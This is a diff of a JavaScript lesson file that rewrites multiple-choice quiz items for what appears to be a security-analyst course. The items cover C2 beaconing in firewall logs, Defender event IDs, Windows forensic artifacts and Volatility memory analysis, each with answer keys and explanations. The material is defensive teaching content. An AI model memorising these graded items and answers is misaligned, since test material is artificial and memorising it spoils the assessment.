+        "explanation": "Rules are evaluated in order and the first matching rule usually wins. Rule 1 (Any to Any, any service, Allow) matches the RDP attempt immediately, so the firewall allows it and never reaches rule 3; this is why rule order changes behaviour. A firewall does not search the list for the most specific rule; position decides. “Deny overrides allow” is how some cloud policy engines work, not how an ordered firewall rulebase works. The default deny sits at the bottom and only catches traffic that no rule above matched."
       },
       {
-        "question": "A firewall log shows a workstation making an ALLOWED outbound HTTPS connection to the same external IP roughly every five minutes, each transferring nearly identical byte counts. Why is this worth investigating even though nothing was blocked?",
+        "question": "A firewall log shows workstation 10.14.22.108 making ALLOWED outbound connections to 91.203.5.14 on TCP 443 at 02:03:11, 02:08:11 and 02:13:11, each about 1,200 bytes, while its user was asleep. What is the best reading of this log and the next step?",
         "options": [
           {
-            "label": "It is not worth investigating at all, because firewall logs only carry real security value when they record a denied connection attempt.",
+            "label": "A routine software-update check, since update agents poll vendors over HTTPS on a schedule; close it as benign",
             "value": "a"
           },
           {
-            "label": "The fixed interval, destination, and size match the regular, mechanical pattern of C2 beaconing, unlike bursty human browsing traffic, even though the firewall allowed it.",
+            "label": "A possible C2 beacon: fixed interval, destination and size; check the IP’s reputation and which process connected",
             "value": "b"
           },
           {
-            "label": "It indicates the firewall's stateful tracking has failed, since a properly functioning stateful firewall would automatically deny any repeating connection pattern.",
+            "label": "Nothing to review: every connection matched an allow rule, so the firewall has already judged the traffic safe",
             "value": "c"
           },
           {
-            "label": "It confirms the destination IP belongs to the company's own cloud backup service, which always connects on a fixed five-minute schedule.",
+            "label": "An outbound port scan: repeated connections to one IP show the workstation probing that server’s services",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A connection to the same destination, at a fixed interval, with near-identical byte counts is the mechanically regular signature of malware beaconing to command-and-control, in contrast to the bursty, irregular pattern of real human browsing — and being allowed does not make it benign, since the firewall's job here was never to block a legitimately-permitted port like 443. The 'not worth investigating' option wrongly assumes only denied traffic matters, ignoring the firewall's role as a sensor. Blaming the firewall's stateful tracking invents a stateful-tracking failure that isn't implied. The 'company cloud backup' option assumes an identity for the destination that the scenario never establishes; that must be confirmed via threat intel, not assumed."
+        "explanation": "Same destination, same port, an almost exact five-minute interval and near-identical byte counts is the mechanical shape of beaconing, not bursty human browsing. The firewall log alone cannot prove it, so the next step is to check the destination’s reputation and pivot to endpoint telemetry to find the process making the connections. An update check is also periodic, which is exactly why you verify the destination and process instead of assuming and closing. An allow rule only means the traffic was permitted, not that it is safe; the firewall is also a sensor. A port scan touches many ports, while these connections all go to the same port 443."
       }
     ],
     "references": [
@@ -7814,96 +7860,96 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "An antivirus alert shows a trojan was 'detected' on a workstation, but the action field reads 'not remediated' rather than 'quarantined'. Why should this raise your priority, and what should you assume?",
+        "question": "An antivirus alert shows a trojan was detected on a workstation, but the action field reads “not remediated” instead of “quarantined”. How should you read this?",
         "options": [
           {
-            "label": "It is lower priority, because 'detected' always means the antivirus fully removed the threat and 'not remediated' simply confirms cleanup finished successfully.",
+            "label": "Low priority: the AV will retry the action on its next scheduled scan, so monitoring the host is enough",
             "value": "a"
           },
           {
-            "label": "The AV saw the threat but did not stop it, so the malicious file may still be present and active, making containment your responsibility now.",
+            "label": "The AV recognised the threat but did not stop it, so the file may still be active; containment is now yours",
             "value": "b"
           },
           {
-            "label": "It means the file was a guaranteed false positive, because antivirus only ever leaves genuinely harmless files unremediated and blocks all real malware.",
+            "label": "Low priority: a detection means the file was already blocked from running, so only the cleanup is pending",
             "value": "c"
           },
           {
-            "label": "It proves the workstation has no antivirus installed, since a real antivirus product is technically incapable of detecting without also removing.",
+            "label": "Probably a false positive: AV leaves a file unremediated when it has low confidence in its own verdict",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A detection with no successful remediation means the AV recognised the threat but did not quarantine or block it, so the malicious file may still be present and active — a high-priority situation where containment now falls to the analyst. The 'lower priority' option wrongly equates 'detected' with removed. The 'guaranteed false positive' option falsely assumes unremediated means false positive. The 'no antivirus installed' option is wrong because AV can detect without remediating (due to permissions, errors, or detect-only configuration) while still being installed."
+        "explanation": "A detection and a successful response are two different things. “Not remediated” means the AV saw the threat and did not quarantine or block it (because of a permission problem, an error or a detect-only setting), so the file may still be present and running, and containment falls to the analyst. Waiting for a later scan assumes a retry that may never succeed and leaves the threat live in the meantime. A detection alone does not mean execution was blocked; blocking is a separate action. An unremediated detection says nothing about confidence; treat it as real until you have checked."
       },
       {
-        "question": "Why is a modern intrusion that abuses PowerShell and other built-in tools (a fileless / living-off-the-land attack) often able to evade traditional signature-based antivirus?",
+        "question": "Why can an intrusion that runs entirely through PowerShell and other built-in Windows tools (a fileless, living-off-the-land attack) often evade traditional signature-based antivirus?",
         "options": [
           {
-            "label": "Because traditional AV focuses on scanning malicious files, and a fileless attack uses legitimate built-in tools with no malicious file to match a signature against.",
+            "label": "Signature AV matches bad files, and this attack uses trusted built-in tools, leaving no malicious file to match",
             "value": "a"
           },
           {
-            "label": "Because PowerShell automatically disables all antivirus products the moment it launches, leaving the endpoint completely without any protection at all.",
+            "label": "PowerShell is a Microsoft-signed tool, so antivirus excludes everything it runs from scanning by default",
             "value": "b"
           },
           {
-            "label": "Because signature-based antivirus only scans network traffic and never inspects any programs or scripts running locally on the endpoint itself.",
+            "label": "Signature databases are updated too slowly to keep up with how quickly attackers write new PowerShell commands",
             "value": "c"
           },
           {
-            "label": "Because living-off-the-land attacks are encrypted end to end, so antivirus is contractually forbidden by the vendor from inspecting them.",
+            "label": "Attackers pack and obfuscate the malicious executable, so its bytes no longer match any stored signature",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Traditional signature-based AV is built to recognise malicious files, but a fileless/living-off-the-land attack abuses legitimate built-in tools like PowerShell and leaves little or no malicious file to match a signature against, so it slips past file-scanning. The claim that PowerShell disables AV is false because PowerShell does not automatically disable AV. The network-traffic-only option is wrong because AV does scan local files and programs, not only network traffic. The encrypted-end-to-end option invents a contractual restriction that does not exist."
+        "explanation": "Traditional AV answers “is this file malicious?”, and a living-off-the-land attack abuses legitimate tools such as PowerShell without dropping a malicious file, so a file signature has nothing to match. PowerShell being signed does not exclude its content from scanning; AMSI exists precisely to hand script content to the AV engine. Update speed is not the issue: even a perfectly current signature database has no file to compare here. Packing and obfuscation are real evasion techniques, but they apply to malicious files, which this attack does not use."
       },
       {
-        "question": "A Defender alert shows Trojan:Win32/Wacatac.B!ml detected in Q3_forecast.xlsm.exe, with Action: Quarantine, but the action event is a 1118 (action failed, error 0x80070005 Access Denied). What should you do next, and why?",
+        "question": "Defender logs Event 1116 for Backdoor:Win32/Remcos.GZ (Severity: Severe) in C:\\Users\\m.cohen\\AppData\\Local\\Temp\\svc_update.exe. The next event is a 1118 with Action: Quarantine and Error Description: “The process cannot access the file because it is being used by another process.” What should you do next?",
         "options": [
           {
-            "label": "Close the alert, because a 'Quarantine' action label always means the threat was successfully contained regardless of whether the action event reports success or failure.",
+            "label": "Close the alert: the Action field reads Quarantine, which records what Defender did to the file in the end",
             "value": "a"
           },
           {
-            "label": "Treat the host as potentially compromised and pivot to EDR immediately, because a failed quarantine means the malicious file may still be present and executable.",
+            "label": "Treat the host as possibly compromised and pivot to EDR now, since the file may still be present and running",
             "value": "b"
           },
           {
-            "label": "Wait for the next scheduled full scan to run, since Defender will automatically retry and succeed at quarantining the file within a few hours.",
+            "label": "Monitor only: Defender retries failed actions, so the next scheduled scan will complete the quarantine",
             "value": "c"
           },
           {
-            "label": "Rename the alert's severity to Low, because a failed action status indicates Defender misidentified a harmless file as this trojan.",
+            "label": "Lower its priority: a 1118 is written when Defender decides its own detection was wrong and backs off",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A 1118 (action failed) means the quarantine attempt did not succeed, so the malicious file may still be present and able to run — the analyst must treat this as an active incident and pivot immediately to endpoint telemetry to check whether it already executed, rather than trusting the 'Quarantine' label alone. Closing the alert wrongly treats the action label as proof of success, ignoring the status field. Waiting for the next scheduled scan assumes an automatic retry that is not guaranteed and wastes critical response time. Lowering the alert's severity wrongly reinterprets a failed remediation as evidence of a false positive."
+        "explanation": "Event 1118 means the remediation action failed; a successful quarantine would have been a 1117 with Action Status: Success. The error even says the file is in use, which is consistent with it running. So the backdoor may still be present and active: treat the host as an active incident and check EDR for what the file did. The Action field names what Defender attempted, not whether it worked; the event ID and status tell you that. Waiting for a later scan leaves a live backdoor in place and assumes a retry that may fail again. A 1118 reports a failed action, not a withdrawn verdict."
       },
       {
-        "question": "In Defender telemetry you see Event ID 5001 (real-time protection disabled) on a server, immediately followed minutes later by a 1116 malware detection with a failed action, and there is no change ticket behind the 5001. How should you read this sequence?",
+        "question": "On a server, Defender logs Event 5001 (real-time protection disabled). A few minutes later a 1116 detection follows, and its remediation fails. No change ticket covers the 5001. How should you read this sequence?",
         "options": [
           {
-            "label": "As a normal maintenance pattern — real-time protection routinely turns itself off and on by design, so a 5001 with no ticket is expected background noise that never needs any review.",
+            "label": "Routine: Defender turns protection off briefly during platform updates, and a detection in that window is expected",
             "value": "a"
           },
           {
-            "label": "As likely deliberate defense-impairment (MITRE T1562.001): protection was turned off with no authorising change, then malware landed and could not be remediated — escalate and find who disabled it.",
+            "label": "Likely defense impairment: protection was turned off without approval, then malware landed unremoved; escalate",
             "value": "b"
           },
           {
-            "label": "As proof the server is fully patched, because event 5001 is only ever generated on systems that have completed all of their pending updates successfully.",
+            "label": "Reassuring: 5001 means Tamper Protection blocked an attempt to disable Defender, so the threat was contained",
             "value": "c"
           },
           {
-            "label": "As a definition-update success message, meaning signatures are current and the following detection can therefore be safely ignored as noise.",
+            "label": "Low concern: 5001 records a definition update, so the detection after it shows fresh signatures doing their job",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Event 5001 means real-time protection was disabled, and with no authorising change ticket, followed by a detection the AV could not remediate, this matches the attacker playbook of impairing defenses (MITRE ATT&CK T1562.001) before dropping a payload. The normal maintenance pattern option is wrong because RTP does not disable itself as routine background behaviour. The 'fully patched' option invents a patch-status meaning for 5001. The definition-update option confuses it with a 2000-series signature-update event."
+        "explanation": "Event 5001 means real-time protection was disabled. With no change ticket behind it, followed by malware the AV could not remove, this matches the attacker pattern of impairing defenses (MITRE ATT&CK T1562.001) before dropping a payload: escalate and find who or what turned protection off. Updates do not explain an unapproved 5001 followed by a failed remediation. Tamper Protection blocking a change is Event 5013, which would mean protection stayed on. Definition updates are the 2000-series (2000 SIGNATURE_UPDATED), not 5001."
       }
     ],
     "references": [
@@ -8161,142 +8207,142 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "During an investigation the attacker cleared the Windows Security event log, so you cannot confirm from logs that their tool ran. You find MIMIKATZ.EXE-A1B2C3D4.pf in C:\\Windows\\Prefetch with a run count of 3 and recent run times. What can you conclude, and why?",
+        "question": "The attacker cleared the Windows Security event log on a workstation, so logs cannot confirm their tool ran. In C:\\Windows\\Prefetch you find MIMIKATZ.EXE-A1B2C3D4.pf, which parses to a run count of 3 and three recent run times. What can you conclude?",
         "options": [
           {
-            "label": "Nothing, because once the Security event log is cleared there is no remaining way on Windows to prove that any particular program was ever executed.",
+            "label": "Only that MIMIKATZ.EXE sat on disk: Prefetch lists files Windows came across, not programs that actually ran",
             "value": "a"
           },
           {
-            "label": "The Prefetch artifact is strong evidence the tool executed (with a run count and last-run times), surviving the log-clearing the attacker performed.",
+            "label": "Strong evidence the tool ran three times, with run times to anchor on, and it survives the cleared log",
             "value": "b"
           },
           {
-            "label": "Only that the file existed on disk, because Prefetch records the presence of files but can never indicate whether a program was actually run.",
+            "label": "That it was blocked three times: a .pf file and run count are written each time a launch is prevented",
             "value": "c"
           },
           {
-            "label": "That the tool was blocked, because a Prefetch file is created by antivirus specifically to record executables it prevented from running on the host.",
+            "label": "Nothing reliable: Prefetch is off by default on workstations, so this .pf file was most likely planted",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Prefetch is a byproduct Windows creates to speed up launching programs, so a .pf file with a run count and last-run times is strong evidence the tool executed — and because it is a separate artifact from the Security log, it survives the attacker clearing that log. The claim that nothing can be proven is wrong because artifacts like Prefetch remain after log-clearing. The 'only that the file existed' option confuses Prefetch (execution) with presence-only artifacts like Shimcache. The 'tool was blocked' option invents an antivirus origin; Prefetch is created by Windows for performance, not by AV to log blocks."
+        "explanation": "Windows writes a Prefetch file to speed up programs that run, so a .pf with a run count and last-run times is strong evidence of execution, and it is a separate artifact that clearing the Security log does not touch. “Present but not proven to run” is the Shimcache caveat, not Prefetch. Prefetch is a performance feature written for launches, not a record of blocked launches. Prefetch is enabled by default on workstations; it is servers where it is often disabled."
       },
       {
-        "question": "Why do experienced forensic analysts treat Shimcache (AppCompatCache) differently from Prefetch when trying to prove a program executed?",
+        "question": "Why do experienced analysts treat a Shimcache (AppCompatCache) entry differently from a Prefetch file when trying to prove that a program executed?",
         "options": [
           {
-            "label": "Shimcache indicates a program was present/registered by the compatibility system, which does not by itself guarantee execution, so it needs corroboration.",
+            "label": "Shimcache shows a program was present to the compatibility system, which on its own does not prove it ran",
             "value": "a"
           },
           {
-            "label": "Shimcache is stored only in memory and disappears at shutdown, so unlike Prefetch it can never be recovered during a post-incident investigation.",
+            "label": "Shimcache’s timestamp is the execution time, so it proves when a program ran but not how many times",
             "value": "b"
           },
           {
-            "label": "Shimcache records the full contents of every executed file, making it so large that analysts avoid it in favour of the smaller Prefetch artifact.",
+            "label": "Shimcache is the stronger record, because it lives in the SYSTEM hive, which an attacker cannot clear",
             "value": "c"
           },
           {
-            "label": "Shimcache is created only by third-party antivirus tools, so its presence depends entirely on which security product happened to be installed.",
+            "label": "Shimcache records only GUI-launched programs, so command-line tools an attacker runs never appear",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Shimcache (AppCompatCache) records executables the compatibility system encountered — path, size, last-modified time — which shows presence/registration but does not by itself prove the program actually ran, so analysts corroborate it with execution artifacts like Prefetch or Amcache. The 'stored only in memory' option is wrong because Shimcache lives in the SYSTEM registry hive and is recoverable. The 'records full file contents' option is false; it stores metadata, not file contents. The 'created only by antivirus tools' option is wrong because Shimcache is a native Windows artifact, not an AV product."
+        "explanation": "Shimcache records executables the compatibility system encountered, with path, size and last-modified time. That proves presence and gives a timeline point, but not execution, so it needs corroboration from Prefetch, Amcache or BAM/DAM. Its timestamp is the file’s last-modified time, not when it ran. Living in the SYSTEM hive does not make it stronger evidence of execution, and the lesson treats every artifact as something an attacker may try to tamper with. Recording GUI launches is what UserAssist does, not Shimcache."
       },
       {
-        "question": "You parse a suspicious file's MFT record and see $STANDARD_INFORMATION shows a creation date of 2019, but $FILE_NAME shows it was created today, matching the intrusion window. A LNK file, Amcache hash, and BAM/DAM entry all corroborate execution around the same time today. What is the strongest supportable conclusion?",
+        "question": "A suspicious file’s MFT record shows a $STANDARD_INFORMATION creation date in 2019, but a $FILE_NAME creation time of today, inside the intrusion window. A LNK file, an Amcache hash and a BAM/DAM entry all point to activity around the same time today. What is the strongest supportable conclusion?",
         "options": [
           {
-            "label": "The file is almost certainly legitimate, since one of the two timestamp structures agrees with the older 2019 date the attacker likely intended.",
+            "label": "Probably legitimate: $STANDARD_INFORMATION is the authoritative record, so 2019 is the real creation date",
             "value": "a"
           },
           {
-            "label": "The mismatched MFT timestamps indicate timestomping, and combined with the corroborating LNK, Amcache, and BAM/DAM evidence, this points to a malicious file placed during the intrusion.",
+            "label": "Timestomping: the 2019 date was backdated, and the other three artifacts place the file in the intrusion",
             "value": "b"
           },
           {
-            "label": "The MFT alone is enough, so the LNK, Amcache, and BAM/DAM entries add nothing further and can be safely ignored in the final report.",
+            "label": "Timestomping, but the case rests on the MFT alone; the LNK, Amcache and BAM/DAM entries add nothing",
             "value": "c"
           },
           {
-            "label": "The discrepancy is a normal Windows behavior for all files and has no forensic significance whatsoever in an investigation.",
+            "label": "Inconclusive: attackers routinely alter $FILE_NAME times, so neither timestamp structure can be trusted",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A $STANDARD_INFORMATION/$FILE_NAME mismatch is the classic signature of timestomping, and the discipline taught throughout this lesson is to corroborate: the LNK, Amcache hash, and BAM/DAM entry independently agreeing on today's date builds a solid, defensible finding rather than relying on one artifact. Calling the file almost certainly legitimate wrongly trusts the easily-altered timestamp. The 'MFT alone is enough' option contradicts the lesson's core principle of corroboration. Calling the discrepancy normal Windows behavior dismisses a well-documented anti-forensic indicator (MITRE Indicator Removal: Timestomp)."
+        "explanation": "$STANDARD_INFORMATION can be changed by ordinary programs, while $FILE_NAME is much harder to reach, so a 2019 versus today mismatch is the classic sign of timestomping. The LNK, Amcache and BAM/DAM entries independently agreeing on today turns that signal into a corroborated finding. Treating $STANDARD_INFORMATION as authoritative trusts the very structure the attacker altered. Corroboration is what makes the conclusion defensible, so the other artifacts are not redundant. $FILE_NAME is the structure most timestomping tools do not touch, which is why it is used as the check."
       },
       {
-        "question": "You suspect an attacker's tool was deleted moments before the machine was imaged, so it no longer has a usable $MFT record. Which artifact is most likely to still show that the file was created and later deleted, along with a reason code for each event?",
+        "question": "You suspect an attacker’s tool was deleted shortly before the machine was imaged, and its $MFT record has since been reused by another file. Which artifact is most likely to still show that the file was created and later deleted, with a reason code for each event?",
         "options": [
           {
-            "label": "$UsnJrnl ($J), which logs a running change journal of file creates, deletes, renames, and overwrites with reason codes, and can outlive the file's own overwritten MFT entry.",
+            "label": "$UsnJrnl ($J), the change journal of creates, deletes and renames with reason codes, which can outlive the MFT entry",
             "value": "a"
           },
           {
-            "label": "The Recycle Bin only, since Windows guarantees every deleted file is preserved there indefinitely regardless of how it was removed.",
+            "label": "$LogFile, the NTFS transaction log, since it keeps a reason-coded history of file creates and deletes for weeks",
             "value": "b"
           },
           {
-            "label": "Prefetch, because every deleted file automatically generates a corresponding .pf file recording its full deletion history.",
+            "label": "The Recycle Bin $I file, since it records the original path and deletion time for every file removed from the volume",
             "value": "c"
           },
           {
-            "label": "UserAssist, since it tracks every file operation performed anywhere on the file system, not just GUI-launched programs.",
+            "label": "Shimcache, since it keeps each executable’s path and timestamps even after the file itself has been deleted",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The USN Change Journal ($UsnJrnl, in its $J data stream) records a running log of file-system changes — including FILE_CREATE and FILE_DELETE reason codes — independently of the $MFT, so it can still show a file existed and was deleted even after its MFT entry has been overwritten. The Recycle Bin option is wrong because attacker tools are frequently deleted in ways that bypass or are purged from the Recycle Bin. The .pf-file option misattributes Prefetch, which tracks program execution, not generic file deletion. The UserAssist option is wrong because UserAssist only tracks GUI-launched programs, not general file-system changes."
+        "explanation": "The USN Change Journal ($UsnJrnl, read from its $J stream) is a running log of file-system changes with reason codes such as FILE_CREATE and FILE_DELETE, and it can keep those records for days to weeks after the file’s MFT entry has been reused. $LogFile is a small transaction log that usually covers only the last few hours, and it records low-level operations rather than a reason-coded change history. $I files exist only for items a user sent to the Recycle Bin, which attacker clean-up often bypasses. Shimcache can show an executable was present after it is gone, but it has no create or delete records."
       },
       {
-        "question": "During a review of the Security event log, you find Event ID 1102 timestamped shortly before the intrusion evidence disappears, but the System channel still shows Event ID 7045 (new service installed) from the same time window. What is the correct reading of this?",
+        "question": "In a Security log you find Event ID 1102 shortly before the intrusion evidence disappears, yet the System channel still shows Event ID 7045 (a new service was installed) from the same time window. What is the correct reading?",
         "options": [
           {
-            "label": "Event ID 1102 records that the Security audit log was cleared, and because clearing Security does not clear other channels, the System channel's 7045 entry survived as a remaining trail.",
+            "label": "1102 records that the Security log was cleared; clearing Security leaves other channels such as System intact",
             "value": "a"
           },
           {
-            "label": "Event ID 1102 is a benign scheduled maintenance event that Windows logs automatically every night and has no connection to log tampering.",
+            "label": "1102 records that the System log was cleared, so the surviving 7045 must have been written after the clearing",
             "value": "b"
           },
           {
-            "label": "Event ID 1102 means the entire event log service crashed, which explains why unrelated entries in other channels also happened to survive.",
+            "label": "1102 records the Security log being cleared, but that wipes every channel, so the 7045 must be a later entry",
             "value": "c"
           },
           {
-            "label": "Event ID 1102 only appears if Audit System Events auditing was explicitly enabled beforehand, so its presence proves auditing was misconfigured.",
+            "label": "1102 is written only when Audit System Events is enabled, so its presence mainly shows auditing was configured",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Event ID 1102 specifically means the Security audit log was cleared, and it is logged regardless of audit policy configuration, recording the account that did it. Clearing the Security channel does not clear other channels like System, so a 7045 entry from the same window can still be found — an attacker who remembers to clear Security but forgets System leaves a second trail. The scheduled maintenance option wrongly treats 1102 as routine; it is a well-known anti-forensic indicator. The service-crash option invents a service crash unrelated to what 1102 documents. The claim that 1102 requires prior auditing is false: 1102 is logged regardless of the Audit System Events policy setting."
+        "explanation": "Event 1102 means the Security audit log was cleared, and it records the account that did it. Clearing the Security channel does not clear System, so a 7045 from the same window survives as a second trail; an attacker who also clears System leaves Event 104 instead. 1102 is about the Security log; log-clearing on other channels is 104. Clearing Security does not wipe other channels, so there is no reason to assume the 7045 is later. 1102 is logged regardless of audit policy."
       },
       {
-        "question": "A departing employee is suspected of removing a client list before handoff. The Security log is intact but shows nothing useful. Which artifact most directly proves a specific named file was deleted by this user, from which path, and exactly when?",
+        "question": "A departing employee is suspected of removing a client list before handover. The Security log is intact but shows nothing useful. Which artifact most directly proves that this user deleted that specific file, from which path, and exactly when?",
         "options": [
           {
-            "label": "The Recycle Bin $I record in the user's SID folder, which stores the deleted file's original full path, its size, and the exact deletion timestamp (and its paired $R file often holds the content).",
+            "label": "The Recycle Bin $I record in the user’s SID folder: original path, size and deletion time ($R often holds the content)",
             "value": "a"
           },
           {
-            "label": "The Shimcache (AppCompatCache), because it reliably records every file deletion on the volume along with the deleting user's name and a guaranteed deletion timestamp.",
+            "label": "The $UsnJrnl FILE_DELETE record, since it carries the file name, deletion time and the account that deleted it",
             "value": "b"
           },
           {
-            "label": "The Prefetch file for the deleted document, since Prefetch is created specifically to log file deletions and stores the original path of any file removed.",
+            "label": "The LNK file for the client list, since a shortcut’s timestamps update when the file it points to is deleted",
             "value": "c"
           },
           {
-            "label": "The SOFTWARE registry hive, which keeps a dedicated per-user deletion journal recording the name and timestamp of every file any account has ever deleted.",
+            "label": "The user’s ShellBags for the Projects folder, since they record each file the user removed while browsing there",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "When a file is sent to the Recycle Bin, Windows writes a $I metadata file (original path, size, deletion time) and a $R content file into the deleting user's SID-named folder, giving direct, dated proof of what that user deleted. The Shimcache option is wrong because Shimcache records program presence, not file deletions. The Prefetch option is wrong because Prefetch is an execution artifact, not a deletion log. The SOFTWARE hive option invents a deletion journal in the SOFTWARE hive that does not exist."
+        "explanation": "When a user sends a file to the Recycle Bin, Windows writes a $I metadata file (original full path, size, exact deletion time) and a $R content file into a folder named after that user’s SID, so the record itself ties the deletion to the user. A $UsnJrnl FILE_DELETE does show the file name and deletion time, but its records carry no account, so it cannot say who deleted it. A LNK records the target’s path and timestamps from when it was opened; it is not updated by a deletion. ShellBags record folders browsed in Explorer, not files removed."
       }
     ],
     "references": [
@@ -8367,119 +8413,119 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "An EDR alert suggests a workstation is compromised, but a full disk scan finds nothing malicious. You suspect fileless malware or code injected into a legitimate process. Why is capturing and analysing memory the right next step, and what must you avoid?",
+        "question": "An EDR alert suggests a workstation is compromised, but a full disk scan finds nothing malicious. You suspect fileless malware or code injected into a legitimate process. What is the right next step?",
         "options": [
           {
-            "label": "Memory analysis is pointless here; you should immediately reboot the machine to clear the infection, since fileless malware cannot survive a restart anyway.",
+            "label": "Run a second, deeper antivirus scan on the live host, and capture memory only once it confirms an infection.",
             "value": "a"
           },
           {
-            "label": "Fileless/injected code lives in RAM and often not on disk, so capture memory before powering off — a reboot would destroy the only evidence of the attack.",
+            "label": "Capture RAM while the host is still running, since injected code may exist only in memory and a reboot erases it.",
             "value": "b"
           },
           {
-            "label": "You should power the machine off first to preserve the disk, then capture memory afterward from the powered-down drive using a standard imaging tool.",
+            "label": "Shut down gracefully and image the disk, since the page file will hold a full copy of what was in memory.",
             "value": "c"
           },
           {
-            "label": "Memory holds no evidence of injected code, so the clean disk scan already proves the alert was a false positive and no further action is needed.",
+            "label": "Collect Prefetch and Amcache first, since they record which programs ran, including code that was injected.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Fileless and injected malware runs in RAM and frequently leaves nothing on disk, so a clean disk scan does not clear the machine; you capture memory while it is still powered on because the order of volatility means a reboot destroys that fleeting evidence. The 'reboot to clear the infection' option is dangerous — rebooting destroys the very evidence and does not guarantee removal. The 'power off first, capture memory afterward' option is impossible, since a powered-off drive holds no RAM. The 'memory holds no evidence' option wrongly treats a clean disk scan as proof of no compromise."
+        "explanation": "Fileless and injected code runs in RAM and often leaves nothing on disk, so a clean disk scan does not clear the host. Memory sits near the top of the order of volatility, so you capture it while the machine is still running. \"Run a second, deeper antivirus scan\" is wrong: file scanning has already failed to see in-memory code, and every minute of delay lets live evidence be overwritten. \"The page file will hold a full copy\" is wrong: the page file holds only fragments, and a shutdown destroys RAM. \"Collect Prefetch and Amcache first\" is wrong: those artifacts show that a program such as a loader ran, but not code injected into another process, and they are far less volatile than RAM."
       },
       {
-        "question": "You have a memory image and want to find code that was injected into a legitimate process (a common fileless technique). Which Volatility plugin is purpose-built for this, and what does it look for?",
+        "question": "You suspect shellcode was written straight into a legitimate process's memory, with no file on disk behind it. Which Volatility plugin is built to find that, and what does it look for?",
         "options": [
           {
-            "label": "The cmdline plugin, which lists command-line arguments and therefore directly displays the full source code of any injected payload in the process.",
+            "label": "windows.ldrmodules, which compares module lists to find DLLs that were loaded from unusual paths on disk.",
             "value": "a"
           },
           {
-            "label": "The malfind plugin, which flags memory regions that are executable but not backed by a file on disk — the fingerprint of injected code.",
+            "label": "windows.malfind, which flags executable memory regions that have no file on disk backing them.",
             "value": "b"
           },
           {
-            "label": "The pslist plugin, which lists visible processes and is guaranteed to include every hidden or injected process running on the system at capture time.",
+            "label": "windows.cmdline, which recovers the arguments each process was started with, including the injected code.",
             "value": "c"
           },
           {
-            "label": "The hivelist plugin, which enumerates registry hives in memory and is the standard way to detect code injected into a running process's address space.",
+            "label": "windows.handles, which lists the files, keys and mutexes a process holds, including its injected regions.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "malfind is designed to hunt for injected code: it flags memory regions that are executable yet not backed by a file on disk, which is the signature of process injection and many fileless techniques. The cmdline option is wrong because cmdline shows launch arguments, not injected code. The pslist option is wrong because pslist shows visible processes and can miss hidden ones (psscan is used for those), and it does not identify injection. The hivelist option is wrong because hivelist enumerates registry hives, unrelated to detecting injection."
+        "explanation": "windows.malfind looks for memory that is executable but not backed by a file on disk, often marked PAGE_EXECUTE_READWRITE. Shellcode written directly into memory leaves exactly that signature. \"windows.ldrmodules\" is the close miss: it catches DLLs that are unlinked or loaded from odd paths, but a LoadLibrary-style DLL is file-backed, and raw shellcode has no module entry for it to compare. \"windows.cmdline\" is wrong: launch arguments show how a process was started, not code written into it afterwards. \"windows.handles\" is wrong: handles are references to open objects such as files, registry keys and mutexes, not the process's memory regions."
       },
       {
-        "question": "You run windows.pslist and see no sign of a suspicious process, but windows.psscan reveals a PID that never appeared in the pslist output. What does this discrepancy most likely indicate, and which plugin caught it?",
+        "question": "windows.pslist shows nothing unusual, but windows.psscan returns this row: PID 4180, PPID 3312, svchost.exe, ExitTime '-'. PID 4180 never appears in the pslist output. What does this most likely indicate?",
         "options": [
           {
-            "label": "A harmless timing difference between the two commands; psscan and pslist always return identical results and the discrepancy should be ignored.",
+            "label": "The process exited before the capture, so pslist dropped it while psscan found its leftover structure.",
             "value": "a"
           },
           {
-            "label": "The process was likely unlinked from the OS's active-process list to hide from tools like pslist, and psscan found it by scanning memory structures directly.",
+            "label": "It was likely unlinked from the active-process list to hide, and psscan found it by scanning memory directly.",
             "value": "b"
           },
           {
-            "label": "The disk image is corrupted, so psscan is scanning the wrong offsets and its result should be discarded in favor of the trusted pslist output.",
+            "label": "The memory image is corrupted at that offset, so the psscan row should be set aside in favour of pslist.",
             "value": "c"
           },
           {
-            "label": "psscan only reports processes that have already exited normally, so the extra PID simply reflects ordinary process termination with no security relevance.",
+            "label": "It is process hollowing, since a hidden svchost.exe is the classic sign that its own code was replaced.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "pslist walks the OS's own list of 'active' processes, which malware can deliberately unlink itself from (a classic rootkit technique); psscan instead scans memory for process structures directly, so it can still find a process that pslist misses — a strong sign of deliberate concealment. The 'harmless timing difference' option dismisses a meaningful and well-documented discrepancy. The corrupted-image option misattributes the difference to corruption rather than the two plugins' different methods. The 'only exited processes' option is only partly true (psscan can show exited processes too) but misses the concealment significance of a PID absent from pslist entirely."
+        "explanation": "pslist walks the operating system's list of active processes, which malware can unlink itself from; psscan scans memory for process structures directly, so it still finds the unlinked process. A live process absent from pslist is a strong sign of deliberate concealment, and here its parent, PID 3312, is the powershell.exe seen in the lesson's pstree output, a second red flag for a process named svchost.exe. \"The process exited before the capture\" is wrong: psscan does show exited processes, but this one has no ExitTime, so it was still running. \"The memory image is corrupted\" is wrong: the two plugins differ by design, and that difference is the finding. \"It is process hollowing\" is wrong: hollowing keeps the process visible under a trusted name and PID; hiding it from the list is a different technique (unlinking)."
       },
       {
-        "question": "You find a process named svchost.exe with the correct PID and command line, but windows.vadinfo shows its base executable region does not match the real svchost.exe on disk, and malfind flags an unbacked executable region at its base address. Which technique does this most likely indicate, and how does it differ from simple DLL injection?",
